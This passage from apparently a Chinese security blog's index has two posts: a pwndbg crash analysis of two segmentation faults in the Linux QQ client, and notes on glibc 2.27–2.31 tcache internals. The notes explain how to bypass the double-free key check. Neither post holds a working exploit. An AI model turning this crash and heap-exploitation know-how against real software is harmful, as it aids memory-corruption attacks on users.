push   rbp   0x7ffff7ce3106 &lt;g_main_context_iteration+6&gt;     mov    rbp, rdi   0x7ffff7ce3109 &lt;g_main_context_iteration+9&gt;     sub    rsp, 8   0x7ffff7ce310d &lt;g_main_context_iteration+13&gt;    test   rdi, rdi\n\n\n\ng_main_context_dispatch函数最后一次崩溃传参\nContinuing.Thread 1 &quot;qq&quot; hit Breakpoint 2, 0x00007ffff7ce47a0 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0                                                                   ERROR: Could not find ELF base!LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA──────────────────────────────────────[ REGISTERS ]────────────────────────────────────── RAX  0x1 RBX  0x1 RCX  0xf0950bcdd20 ◂— 0x0 RDX  0x1 RDI  0xf094fee6dc0 ◂— 0x0 RSI  0x1 R8   0x0 R9   0x7fffffffd840 ◂— 0x3000000028 /* &#x27;(&#x27; */ R10  0x7ffff7fca080 R11  0x293 R12  0x3 R13  0xf094fee6dc0 ◂— 0x0 R14  0x7fffffffda10 ◂— 0x352 R15  0x2 RBP  0xf095048bf20 ◂— 0x100000021 /* &#x27;!&#x27; */ RSP  0x7fffffffd9d8 —▸ 0x7ffff7d38621 ◂— jmp    0x7ffff7d384c0 RIP  0x7ffff7ce47a0 (g_main_context_dispatch) ◂— push   r15───────────────────────────────────────[ DISASM ]──────────────────────────────────────── ► 0x7ffff7ce47a0 &lt;g_main_context_dispatch&gt;       push   r15    ↓   0x7ffff7ce47a4 &lt;g_main_context_dispatch+4&gt;     mov    r14, rdi   0x7ffff7ce47a7 &lt;g_main_context_dispatch+7&gt;     push   r13   0x7ffff7ce47a9 &lt;g_main_context_dispatch+9&gt;     push   r12   0x7ffff7ce47ab &lt;g_main_context_dispatch+11&gt;    push   rbp   0x7ffff7ce47ac &lt;g_main_context_dispatch+12&gt;    push   rbx   0x7ffff7ce47ad &lt;g_main_context_dispatch+13&gt;    sub    rsp, 0x68   0x7ffff7ce47b1 &lt;g_main_context_dispatch+17&gt;    mov    rax, qword ptr fs:[0x28]   0x7ffff7ce47ba &lt;g_main_context_dispatch+26&gt;    mov    qword ptr [rsp + 0x58], rax   0x7ffff7ce47bf &lt;g_main_context_dispatch+31&gt;    xor    eax, eax   0x7ffff7ce47c1 &lt;g_main_context_dispatch+33&gt;    call   g_mutex_lock &lt;0x7ffff7d32250&gt;────────────────────────────────────────[ STACK ]────────────────────────────────────────00:0000│ rsp  0x7fffffffd9d8 —▸ 0x7ffff7d38621 ◂— jmp    0x7ffff7d384c001:0008│      0x7fffffffd9e0 ◂— 0x35202:0010│      0x7fffffffd9e8 ◂— 0x249b1fe803:0018│      0x7fffffffd9f0 ◂— 0x10000000004:0020│      0x7fffffffd9f8 —▸ 0x7ffff7cead90 (g_poll) ◂— mov    esi, esi05:0028│      0x7fffffffda00 ◂— 0xaaaaaaaaaaaaaaaa06:0030│      0x7fffffffda08 ◂— 0x007:0038│ r14  0x7fffffffda10 ◂— 0x352──────────────────────────────────────[ BACKTRACE ]────────────────────────────────────── ► f 0     7ffff7ce47a0 g_main_context_dispatch   f 1     7ffff7d38621   f 2     7ffff7ce3131 g_main_context_iteration+49   f 3     555556152012   f 4     55555617d0e5   f 5     5555561660ee   f 6     555555f0f6f4   f 7     7ffff6f70152 __libc_start_main+242─────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; Continuing.Thread 1 &quot;qq&quot; hit Breakpoint 2, 0x00007ffff7ce47a0 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0                                                                   ERROR: Could not find ELF base!LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA──────────────────────────────────────[ REGISTERS ]────────────────────────────────────── RAX  0x1 RBX  0x1 RCX  0x4 ;diff RDX  0x1 RDI  0xf094fee6dc0 ◂— 0x0 RSI  0x1 R8   0x0 R9   0x7fffffffd840 ◂— 0x3000000028 /* &#x27;(&#x27; */ R10  0x7ffff7fca080 R11  0x293 R12  0x3 R13  0xf094fee6dc0 ◂— 0x0 R14  0x7fffffffda10 ◂— 0x353 ; diff ++ R15  0x2 RBP  0xf095048bf20 ◂— 0x100000021 /* &#x27;!&#x27; */ RSP  0x7fffffffd9d8 —▸ 0x7ffff7d38621 ◂— jmp    0x7ffff7d384c0 RIP  0x7ffff7ce47a0 (g_main_context_dispatch) ◂— push   r15───────────────────────────────────────[ DISASM ]──────────────────────────────────────── ► 0x7ffff7ce47a0 &lt;g_main_context_dispatch&gt;       push   r15    ↓   0x7ffff7ce47a4 &lt;g_main_context_dispatch+4&gt;     mov    r14, rdi   0x7ffff7ce47a7 &lt;g_main_context_dispatch+7&gt;     push   r13   0x7ffff7ce47a9 &lt;g_main_context_dispatch+9&gt;     push   r12   0x7ffff7ce47ab &lt;g_main_context_dispatch+11&gt;    push   rbp   0x7ffff7ce47ac &lt;g_main_context_dispatch+12&gt;    push   rbx   0x7ffff7ce47ad &lt;g_main_context_dispatch+13&gt;    sub    rsp, 0x68   0x7ffff7ce47b1 &lt;g_main_context_dispatch+17&gt;    mov    rax, qword ptr fs:[0x28]   0x7ffff7ce47ba &lt;g_main_context_dispatch+26&gt;    mov    qword ptr [rsp + 0x58], rax   0x7ffff7ce47bf &lt;g_main_context_dispatch+31&gt;    xor    eax, eax   0x7ffff7ce47c1 &lt;g_main_context_dispatch+33&gt;    call   g_mutex_lock &lt;0x7ffff7d32250&gt;────────────────────────────────────────[ STACK ]────────────────────────────────────────00:0000│ rsp  0x7fffffffd9d8 —▸ 0x7ffff7d38621 ◂— jmp    0x7ffff7d384c001:0008│      0x7fffffffd9e0 ◂— 0x35302:0010│      0x7fffffffd9e8 ◂— 0x15108cf603:0018│      0x7fffffffd9f0 ◂— 0x10000000004:0020│      0x7fffffffd9f8 —▸ 0x7ffff7cead90 (g_poll) ◂— mov    esi, esi05:0028│      0x7fffffffda00 ◂— 0xaaaaaaaaaaaaaaaa06:0030│      0x7fffffffda08 ◂— 0x007:0038│ r14  0x7fffffffda10 ◂— 0x353──────────────────────────────────────[ BACKTRACE ]────────────────────────────────────── ► f 0     7ffff7ce47a0 g_main_context_dispatch   f 1     7ffff7d38621   f 2     7ffff7ce3131 g_main_context_iteration+49   f 3     555556152012   f 4     55555617d0e5   f 5     5555561660ee   f 6     555555f0f6f4   f 7     7ffff6f70152 __libc_start_main+242─────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; Continuing.Thread 1 &quot;qq&quot; received signal SIGSEGV, Segmentation fault.0x00007ffff7ce49e5 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0ERROR: Could not find ELF base!LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA──────────────────────────────────────[ REGISTERS ]────────────────────────────────────── RAX  0x0 RBX  0x7ffff7000000 (____wcstof128_l_internal+1168) ◂— adc    eax, 0x748b0000 RCX  0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */ RDX  0x7ffff7e450a0 (__pthread_keys) ◂— 0x1 RDI  0xf09506b6740 ◂— 0xfffff0f400000002 RSI  0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18] R8   0xf094fee8520 ◂— 0x0 R9   0x7fffffffd850 ◂— 0x3000000028 /* &#x27;(&#x27; */ R10  0x7ffff7fca080 R11  0x286 R12  0x1 R13  0xf0950489980 ◂— 0x0 R14  0xf094fee6dc0 ◂— 0x0 R15  0x2 RBP  0xf0950b47d20 —▸ 0xf09506b6740 ◂— 0xfffff0f400000002 RSP  0x7fffffffd940 —▸ 0xf09506b6740 ◂— 0xfffff0f400000002 RIP  0x7ffff7ce49e5 (g_main_context_dispatch+581) ◂— call   qword ptr [rbx + 8]───────────────────────────────────────[ DISASM ]──────────────────────────────────────── ► 0x7ffff7ce49e5 &lt;g_main_context_dispatch+581&gt;    call   qword ptr [rbx + 8]        rdi: 0xf09506b6740 ◂— 0xfffff0f400000002        rsi: 0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18]        rdx: 0x7ffff7e450a0 (__pthread_keys) ◂— 0x1        rcx: 0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */    0x7ffff7ce49e8 &lt;g_main_context_dispatch+584&gt;    mov    rdi, r14   0x7ffff7ce49eb &lt;g_main_context_dispatch+587&gt;    call   g_mutex_lock &lt;0x7ffff7d32250&gt;    0x7ffff7ce49f1 &lt;g_main_context_dispatch+593&gt;    mov    edx, dword ptr [rsp + 0x2c]   0x7ffff7ce49f5 &lt;g_main_context_dispatch+597&gt;    mov    eax, dword ptr [rbp + 0x2c]   0x7ffff7ce49f8 &lt;g_main_context_dispatch+600&gt;    test   edx, edx   0x7ffff7ce49fa &lt;g_main_context_dispatch+602&gt;    jne    g_main_context_dispatch+610 &lt;0x7ffff7ce4a02&gt;    0x7ffff7ce49fc &lt;g_main_context_dispatch+604&gt;    and    eax, 0xfffffffd   0x7ffff7ce49ff &lt;g_main_context_dispatch+607&gt;    mov    dword ptr [rbp + 0x2c], eax   0x7ffff7ce4a02 &lt;g_main_context_dispatch+610&gt;    and    eax, 0x41   0x7ffff7ce4a05 &lt;g_main_context_dispatch+613&gt;    cmp    eax, 0x41────────────────────────────────────────[ STACK ]────────────────────────────────────────00:0000│ rsp  0x7fffffffd940 —▸ 0xf09506b6740 ◂— 0xfffff0f40000000201:0008│      0x7fffffffd948 ◂— 0x002:0010│      0x7fffffffd950 —▸ 0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */03:0018│      0x7fffffffd958 ◂— 0xc646f4bc6304:0020│      0x7fffffffd960 —▸ 0x7ffff7d42760 ◂— &#x27;(unnamed)&#x27;05:0028│      0x7fffffffd968 ◂— 0x106:0030│      0x7fffffffd970 ◂— 0x007:0038│      0x7fffffffd978 —▸ 0x555555c44670 ◂— push   rbp──────────────────────────────────────[ BACKTRACE ]────────────────────────────────────── ► f 0     7ffff7ce49e5 g_main_context_dispatch+581   f 1     7ffff7d38621   f 2     7ffff7ce3131 g_main_context_iteration+49   f 3     555556152012   f 4     55555617d0e5   f 5     5555561660ee   f 6     555555f0f6f4   f 7     7ffff6f70152 __libc_start_main+242─────────────────────────────────────────────────────────────────────────────────────────\n\n\n\n\n\n0x527A0  + 581 &#x3D;&#x3D; x529e5\n其他线程漏洞经过多线程调试, 找到bug2, 发生在Qnox_LogicThrea线程中\npwndbg&gt; Thread 5 &quot;Qnox_LogicThrea&quot; received signal SIGSEGV, Segmentation fault.0x000055555621f539 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────── RAX  0xffffc39f73c44bb8 RBX  0x3c62263bf000 ◂— 0x0 RCX  0x55555621f500 ◂— push   rbp RDX  0xf0 RDI  0x7ffff515f830 ◂— 0xaaaaaaaaaaaaaaaa RSI  0x3c622690f240 ◂— 0xffffc39f73c44bb8 R8   0x3c62264ca003 ◂— 0x0 R9   0x1 R10  0x7ffff7fca080 R11  0x286 R12  0x0 R13  0xaaaaaaaaaaaaaaaa R14  0x0 R15  0x3c62267d3000 —▸ 0x5555570c4350 —▸ 0x55555621d7d0 ◂— push   rbp RBP  0x7ffff515f870 —▸ 0x7ffff515f930 —▸ 0x7ffff515fa10 —▸ 0x7ffff515fa60 —▸ 0x7ffff515fac0 ◂— ... RSP  0x7ffff515f6e0 ◂— 0x0 RIP  0x55555621f539 ◂— call   qword ptr [rax + 0x30]─────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────── ► 0x55555621f539    call   qword ptr [rax + 0x30]    0x55555621f53c    mov    edi, 2   0x55555621f541    call   0x55555614f1b0    0x55555621f546    test   al, al   0x55555621f548    je     0x55555621f5de    0x55555621f54e    lea    rsi, [rip - 0xb59197]   0x55555621f555    lea    rdi, [rbp - 0x178]   0x55555621f55c    mov    edx, 0x107   0x55555621f561    mov    ecx, 2   0x55555621f566    call   0x55555614f2a0    0x55555621f56b    lea    rdi, [rbp - 0x170]\n\n可以看到, call   qword ptr [rax + 0x30]指令中, rax对应的值为: 0xffffc39f73c44bb8\n指令: 0x55555 621f539 -  0x55555 5554000 &#x3D;&#x3D; 0xccb539\nvmmap\n0x555555554000     0x555555b69000 r--p   615000 0      /opt/tencent-qq/qq   0x555555b69000     0x5555570a6000 r-xp  153d000 614000 /opt/tencent-qq/qq   0x5555570a6000     0x55555710d000 r--p    67000 1b50000 /opt/tencent-qq/qq   0x55555710d000     0x555557119000 rw-p     c000 1bb6000 /opt/tencent-qq/qq   0x555557119000     0x55555717a000 rw-p    61000 0      [heap]\n\n在0xccb539处找到call    qword ptr [rax+30h]\n0000000CCB500 ; __unwind &#123;.text:0000000000CCB500                 push    rbp.text:0000000000CCB501                 mov     rbp, rsp.text:0000000000CCB504                 push    r15.text:0000000000CCB506                 push    r14.text:0000000000CCB508                 push    rbx.text:0000000000CCB509                 sub     rsp, 178h.text:0000000000CCB510                 mov     r15, rdi.text:0000000000CCB513                 mov     rax, fs:28h.text:0000000000CCB51C                 mov     [rbp+var_20], rax.text:0000000000CCB520                 movaps  xmm0, cs:xmmword_122F40.text:0000000000CCB527                 movaps  [rbp+var_40], xmm0.text:0000000000CCB52B                 mov     [rbp+var_30], 0AAAAAAAAh.text:0000000000CCB532                 mov     rax, [rsi].text:0000000000CCB535                 lea     rdi, [rbp+var_40].text:0000000000CCB539                 call    qword ptr [rax+30h] // vul.text:0000000000CCB53C                 mov     edi, 2.text:0000000000CCB541                 call    sub_BFB1B0.text:0000000000CCB546                 test    al, al.text:0000000000CCB548                 jz      loc_CCB5DE.text:0000000000CCB54E                 lea     rsi, aQnoxMsfMsfping ; &quot;../../qnox/msf/msfping.cc&quot;.text:0000000000CCB555                 lea     rdi, [rbp+var_178].text:0000000000CCB55C                 mov     edx, 107h.text:0000000000CCB561                 mov     ecx, 2.text:0000000000CCB566                 call    sub_BFB2A0.text:0000000000CCB56B                 lea     rdi, [rbp+var_170].text:0000000000CCB572                 lea     rsi, unk_19F568.text:0000000000CCB579                 mov     edx, 11h.text:0000000000CCB57E                 call    sub_66E360.text:0000000000CCB583                 mov     r14, rax.text:0000000000CCB586                 lea     rbx, [rbp+var_190].text:0000000000CCB58D                 lea     rsi, [rbp+var_40].text:0000000000CCB591                 mov     rdi, rbx.text:0000000000CCB594                 call    sub_1706710.text:0000000000CCB599                 movzx   edx, [rbp+var_179].text:0000000000CCB5A0                 test    dl, dl.text:0000000000CCB5A2                 jns     short loc_CCB5B2.text:0000000000CCB5A4                 mov     rbx, [rbp+var_190].text:0000000000CCB5AB                 mov     rdx, [rbp+var_188].text:0000000000CCB5B2.text:0000000000CCB5B2 loc_CCB5B2:                             ; CODE XREF: vul2+A2↑j.text:0000000000CCB5B2                 mov     rdi, r14.text:0000000000CCB5B5                 mov     rsi, rbx.text:0000000000CCB5B8                 call    sub_66E360.text:0000000000CCB5BD                 cmp     [rbp+var_179], 0.text:0000000000CCB5C4                 jns     short loc_CCB5D2.text:0000000000CCB5C6                 mov     rdi, [rbp+var_190].text:0000000000CCB5CD                 call    free.text:0000000000CCB5D2.text:0000000000CCB5D2 loc_CCB5D2:                             ; CODE XREF: vul2+C4↑j.text:0000000000CCB5D2                 lea     rdi, [rbp+var_178].text:0000000000CCB5D9                 call    sub_BFBB10.text:0000000000CCB5DE.text:0000000000CCB5DE loc_CCB5DE:                             ; CODE XREF: vul2+48↑j.text:0000000000CCB5DE                 add     dword ptr [r15+2Ch], 1.text:0000000000CCB5E3                 mov     rdi, r15.text:0000000000CCB5E6                 call    sub_CCA290.text:0000000000CCB5EB                 lea     rdi, [rbp+var_40].text:0000000000CCB5EF                 call    sub_B636B0.text:0000000000CCB5F4                 mov     rax, fs:28h.text:0000000000CCB5FD                 cmp     rax, [rbp+var_20].text:0000000000CCB601                 jnz     short loc_CCB611.text:0000000000CCB603                 add     rsp, 178h.text:0000000000CCB60A                 pop     rbx.text:0000000000CCB60B                 pop     r14.text:0000000000CCB60D                 pop     r15.text:0000000000CCB60F                 pop     rbp.text:0000000000CCB610                 retn\n\n\n\n漏洞2伪代码\nunsigned __int64 __fastcall vul2(__int64 a1, __int64 a2)&#123;  __int64 v2; // r14  __int64 *v3; // rbx  __int64 v4; // rdx  __int64 *v6; // [rsp+0h] [rbp-190h]  __int64 v7; // [rsp+8h] [rbp-188h]  unsigned __int8 v8; // [rsp+17h] [rbp-179h]  char v9; // [rsp+18h] [rbp-178h]  char v10; // [rsp+20h] [rbp-170h]  __int128 v11; // [rsp+150h] [rbp-40h]  int v12; // [rsp+160h] [rbp-30h]  unsigned __int64 v13; // [rsp+170h] [rbp-20h]  v13 = __readfsqword(0x28u);  v11 = xmmword_122F40;  v12 = -1431655766;  (*(void (__fastcall **)(__int128 *))(*(_QWORD *)a2 + 48LL))(&amp;v11);// 出现段错误函数指针调用  if ( sub_BFB1B0(2) )  &#123;    sub_BFB2A0((__int64)&amp;v9, (__int64)&quot;../../qnox/msf/msfping.cc&quot;, 0x107u, 2);    v2 = sub_66E360(&amp;v10, &amp;unk_19F568, 17LL);    v3 = (__int64 *)&amp;v6;    sub_1706710(&amp;v6, &amp;v11);    v4 = v8;    if ( (v8 &amp; 0x80u) != 0 )    &#123;      v3 = v6;      v4 = v7;    &#125;    sub_66E360(v2, v3, v4);    if ( (v8 &amp; 0x80u) != 0 )      free(v6);    sub_BFBB10(&amp;v9);  &#125;  ++*(_DWORD *)(a1 + 44);  sub_CCA290(a1);  sub_B636B0(&amp;v11);  return __readfsqword(0x28u);&#125;\n\n\n\n经过以上调试, 发现目前存在两个段错误漏洞, 应该是多线程处理对象时处理不当造成的, 望腾讯公司进行严格的代码审计与修复\nLinux QQ 无用解决闪退的方法解决方案1删除掉配置文件即可\nhttps://blog.csdn.net/qq_36462403/article/details/105902227\nrm -r ~/.config/tencent-qq\n\n经过测试, 无效\n解决方案2https://blog.csdn.net/weixin_33692284/article/details/91508019\n经过测试,无效\n其他知识补充gtklib之主事件循环https://www.cnblogs.com/silvermagic/p/9087881.html\n介绍GLib和GTK+应用的主事件循环管理着所有事件源。这些事件的来源有很多种比如文件描述符(文件、管道或套接字)或超时。新类型的事件源可以通过g_source_attach()函数添加。 为了让多组独立事件源能够在不同的线程中被处理，每个事件源都会关联一个GMainContext。一个线程只能运行一个GMainContext，但是在其他线程中能够对事件源进行添加和删除操作。 每个事件源都被赋予了优先级。默认的优先级是G_PRIORITY_DEFAULT(0)。值越小优先级越高，优先级高的事件源优先处理。 Idle函数在没有更高优先级的事件被处理的时候才会执行。 GMainLoop数据类型代表了一个主事件循环。通过g_main_loop_new()来创建GMainLoop对象。在添加完初始事件源后执行g_main_loop_run()，主循环将持续不断的检查每个事件源产生的新事件，然后分发它们，直到处理来自某个事件源的事件的时候触发了g_main_loop_quit()调用退出主循环为止。 GMainLoop实例能够被递归创建。在GTK+应用中经常使用这种方式来显示模态对话框。注意如果一个事件源被添加到一个GMainContext，那么它将被所有关联这个GMainContext的主线程检查和分发。 GTK+对这些函数做了些封装，例如gtk_main、gtk_mian_quit和gtk_events_pending。\n自定义事件类型GMainLoop一个不常用的特性就是能够创建一个新的事件源类型，然后当做内置事件源的扩展来使用。一个新的事件源类型通常用来处理GDK事件。通过继承GSource结构来创建一个新的事件源类型。继承产生的新事件源类型表示GSource结构作为新事件源类型的第一个元素然后其他元素紧跟其后。使用g_source_new函数来创建新的事件源类型实例，函数的参数就是新的事件源类型大小。GSourceFuncs决定新的事件源类型的行为。 新的事件源有两种基本方式与GMainContext交互。它们GSourceFuncs中的准备函数能够设置睡眠事件，用来决定主循环下次检测它们的时间。此外事件源也可以使用g_source_add_poll()函数添加文件描述符到GMainContext进行检测。\n自定义主循环迭代执行g_main_context_iteration()函数可以完成GMainContext的单次迭代。在一些情况下，我们可能想获取主循环更多的底层控制细节，我们可以调用**g_main_context_iteration()里的组件函数：g_main_context_prepare()、g_main_context_prepare ()、g_main_context_query()、g_main_context_check()和g_main_context_dispatch()**。\nMain Context状态在UNIX系统上，GLib的主循环和**fork()**是不兼容的。\n事件源内存管理有两种可选的方式来管理传递给GSource回调函数用户数据的内存。用户数据就是在调用**g_timeout_add()、g_timeout_add_full()、g_idle_add()**传入的参数。这些数据通常被timeout或idle回调函数所拥有，比如一个构件或一个网路协议的实现。有些时候这些回调函数会在数据被销毁的后背调用，因为使用了已经被释放的内存，所以这会导致一个错误。\n\n第一种推荐的方法就是保存g_timeout_add()、g_source_attach()返回的事件源ID，然后在其维持的用户数据被释放后显示的将其从GMainContext移除。这样就能保证调用这些回调函数的时候，这些用户数据依然有效。\n第二种就是保存这些回调函数中的用户数据对象的引用，然后在GDestroyNotify回调函数中释放它。这样就能确保数据对象在事件源最后一次调用然后被释放前一直有效。GDestroyNotify回调函数是GSource函数的一个变体的入参，它在事件源被释放时调用。第二条途径有必要提醒下，如果在事件源还没被调用前主循环就结束的情况下，用户数据对象被维持状态是不确定的。\n\n官方文档 gtk库函数参考：https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html\ng_main_context_dispatch ()voidg_main_context_dispatch (GMainContext *context);\n\nDispatches all pending sources.\nYou must have successfully acquired the context with g_main_context_acquire() before you may call this function.\ng_main_context_acquire ()gbooleang_main_context_acquire (GMainContext *context);\n\nTries to become the owner of the specified context. If some other thread is the owner of the context, returns FALSE immediately. Ownership is properly recursive: the owner can require ownership again and will release ownership when g_main_context_release() is called as many times as g_main_context_acquire().\nYou must be the owner of a context before you can call g_main_context_prepare(), g_main_context_query(), g_main_context_check(), g_main_context_dispatch().\ng_main_context_iteration ()gbooleang_main_context_iteration (GMainContext *context,                          gboolean may_block);\n\nRuns a single iteration for the given main loop. This involves checking to see if any event sources are ready to be processed, then if no events sources are ready and may_block is TRUE, waiting for a source to become ready, then dispatching the highest priority events sources that are ready. Otherwise, if may_block is FALSE sources are not waited to become ready, only those highest priority events sources will be dispatched (if any), that are ready at this given moment without further waiting.\nNote that even when may_block is TRUE, it is still possible for g_main_context_iteration() to return FALSE, since the wait may be interrupted for other reasons than an event source becoming ready.\nParameters\n\n\ncontext\na GMainContext (if NULL, the default context will be used).\n[nullable]\n\n\n\nmay_block\nwhether the call may block.\n\n\n\nReturns TRUE if events were dispatched.\nGMainContexttypedef struct _GMainContext GMainContext;\n\nThe GMainContext struct is an opaque data type representing a set of sources to be handled in a main loop.\n","categories":["security"],"tags":["bug"]},{"title":"HEAP-2020-姿势学习","url":"/2020/10/29/security/ctf/pwn/new-heap-exploit/","content":"HEAP-2020-姿势学习在2020 10月份的时候，glibc 2.27将更新至2.29一样的特性。\n各个hepe的利用方式，很大部分依赖于glibc版本的不同，这里主要讲研究呀下glibc 2.27与2.29以及后续的glibc保护。\nTcache结构tcache_entry2.29版本\ntypedef struct tcache_entry&#123;  struct tcache_entry *next;  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;&#125; tcache_entry;\n\n2.27 老版本\ntypedef struct tcache_entry&#123;  struct tcache_entry *next;&#125; tcache_entry;\n\n发现-2.29在tcache_entry结构体中加上结构体指针key，该key值为tcache_perthread_struct的地址。\ntcache_put &amp;&amp; tcache_getglibc-2.29\ntcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;\t//new  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;tcache_get (size_t tc_idx)&#123;  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  e-&gt;key = NULL;\t//new  return (void *) e;&#125;\n\n\n\nglibc 2.27\ntcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;tcache_get (size_t tc_idx)&#123;  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  return (void *) e;&#125;\n\n在将chunk放入tcache之后，会将chunk-&gt;key设置为tcachestruct，即是heap的开头，来表示该chunk已经放入了tcache。而将chunk从tcache取出来后则将chunk-&gt;key设置为NULL清空。 总体上对tcache的改动是在tcacheentry结构指针中增加了一个变量key，来表明该chunk是否处于tcache的状态。\nfree函数glibc-2.29\n&#123;    size_t tc_idx = csize2tidx (size);    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)      &#123;\t/* Check to see if it&#x27;s already in the tcache.  */\ttcache_entry *e = (tcache_entry *) chunk2mem (p);\t/* This test succeeds on double free.  However, we don&#x27;t 100%\t   trust it (it also matches random payload data at a 1 in\t   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely\t   coincidence before aborting.  */\tif (__glibc_unlikely (e-&gt;key == tcache))\t  &#123;\t    tcache_entry *tmp;\t    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\t    for (tmp = tcache-&gt;entries[tc_idx];\t\t tmp;\t\t tmp = tmp-&gt;next)\t      if (tmp == e)\t\tmalloc_printerr (&quot;free(): double free detected in tcache 2&quot;);\t    /* If we get here, it was a coincidence.  We&#x27;ve wasted a\t       few cycles, but don&#x27;t abort.  */\t  &#125;\tif (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)\t  &#123;\t    tcache_put (p, tc_idx);\t    return;\t  &#125;      &#125; &#125;\n\n\n\nglibc 2.27\n&#123;    size_t tc_idx = csize2tidx (size);    if (tcache//free+172        &amp;&amp; tc_idx &lt; mp_.tcache_bins        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)      &#123;        tcache_put (p, tc_idx);        return;      &#125;  &#125;\n\n\n\nglibc-2.29中增加了一个检查：\nchunk在放入tcache之前会检查chunk-&gt;key是否为tcache，表示是否已经存在于tcache中，如果已经存在于tcache，则会检查tcache链中是否有跟他相同的堆块。 这对double  free造成了很大的障碍。\n常用绕过的一种方法是：如果有存在UFA漏洞或者形成堆重叠等情况，可以修改chunk-&gt;key，使其e-&gt;key !&#x3D; tcache，就可以绕过检查\nglibc-2.31前置知识为了增加安全性，2.29 版本以后的 tcache_entry 结构体发生了变化，增加了 key 字段。\ntypedef struct tcache_entry&#123;  struct tcache_entry *next;/* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;&#125; tcache_entry;\n\n\n\n在 free 的时候多了一段检测\nif (__glibc_unlikely (e-&gt;key == tcache))&#123;    tcache_entry *tmp;    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);    for (tmp = tcache-&gt;entries[tc_idx]; //遍历tcache链子中是否存在         tmp;         tmp = tmp-&gt;next)        if (tmp == e)            malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);/* If we get here, it was a coincidence.  We&#x27;ve wasted afew cycles, but don&#x27;t abort.  */&#125;\n\n\n\n之后在 tcache_put 函数中多了一段 e-&gt;key&#x3D;tcache 的代码：\nstatic __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123;    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free willdetect a double free.  */    e-&gt;key = tcache;    e-&gt;next = tcache-&gt;entries[tc_idx];    tcache-&gt;entries[tc_idx] = e;    ++(tcache-&gt;counts[tc_idx]);&#125;\n\n整个流程为：调用 tcache_put 放入 tcache_entry 的时候，其 next  指针和之前变化一致，但是其 key 字段指向了tcache。接下来 free 的时候会检测 key 字段是否为 tcache，如果相等则检测  free 的指针值是否在对应的tcache_entry 链上，如果在则视为程序在 double free，进而终止程序。这里为什么逻辑不是  key 等于 tcache 直接中断，应该是考虑了用户放在 key 字段的数据恰好为 tcache 值的情况。\n这种简单的方法使得之前的 tcache 非常随意的 double free 失效了。不过绕过的方式也非常简单，即在构造double free 时提前修改 key 字段的值为任意其他的值。所以相关的所有攻击手法依然可用，并且增加了能够修改key 字段的前提。\n还有一个变动就是 tcache 本身的结构体发生了变化：counts 字段由原来的一字节变成了现在的两字节。\ntypedef struct tcache_perthread_struct&#123;    uint16_t counts[TCACHE_MAX_BINS];    tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;\n\n这个变动使得一些分析堆利用的 gdb 插件解析出现了一定的错误。\nfastbin\nfastbin 与 tcache 之间存在一种新的 stash 机制：\n/* While we&#x27;re here, if we see other chunks of the same size,stash them in the tcache.  */size_t tc_idx = csize2tidx (nb);if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;    mchunkptr tc_victim;/* While bin not empty and tcache not full, copy chunks.  */    while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count           &amp;&amp; (tc_victim = *fb) != NULL)    &#123;        if (SINGLE_THREAD_P)            *fb = tc_victim-&gt;fd;else        &#123;            REMOVE_FB (fb, pp, tc_victim);            if (__glibc_unlikely (tc_victim == NULL))                break;        &#125;        tcache_put (tc_victim, tc_idx);    &#125;&#125;\n\n当从 fastbin 里取 chunk 时，其余的 chunk 会被依次放入对应的 tcache 中，终止条件时 fastbin 链为空或者 tcache 装满。\n其余并无多余变动，要注意做 fastbin 